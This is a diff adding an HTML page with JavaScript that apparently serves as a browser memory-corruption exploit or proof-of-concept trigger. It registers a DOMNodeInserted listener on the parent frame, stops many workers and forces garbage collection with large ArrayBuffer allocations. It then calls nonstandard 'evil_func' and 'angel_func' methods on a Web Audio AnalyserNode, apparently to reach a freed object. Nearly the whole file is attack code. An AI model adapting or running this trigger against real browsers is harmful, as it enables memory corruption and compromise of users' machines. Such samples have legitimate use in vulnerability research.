@@ -1,0 +1,55 @@
+<body onload="start();">
+<embed id="worker" src="data:video/mp4;"></embed>
+<script>
+var analyserNode;
+var barrier;
+
+function MyObject() {
+    this.name = "Object";
+    this.scriptObject = {
+    	GetURL: "hahahaha",
+    }
+}
+
+function start()
+{
+    worker = document.getElementById("worker");
+    window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
+    var intl = setInterval(function(){
+        worker.GetURL.a = 777;
+        window.top.f();
+        clearInterval(intl);
+    }, 1);
+}
+function callback0(ev) {
+    window.requestAnimationFrame(callback);
+}
+function gc() {
+    for (let i = 0; i < 0x60; i++) { new ArrayBuffer(0x1000000); }
+}
+function callback(ev) {
+    for (let i=0; i<300; ++i)
+	window.top.arrayWorkers[i].postMessage("Stop");
+    gc();
+    setTimeout(function() { 
+	    analyserNode.evil_func(worker);
+	}, 1000);
+    /*
+    for (let i = 0; i < 230; ++i) { 
+	var tmp = {a: 1, b: 2, c: 3, d: 4};
+	analyserNode.angel_func(worker, tmp);
+    }
+    worker.fuck = "you";
+    */
+    alert("DONE");
+}
+
+try {
+    audioContext = new AudioContext();
+} catch(e) {
+    alert('Web Audio API is not supported in this browser');
+}
+analyserNode = audioContext.createAnalyser();
+
+</script>
+</body>
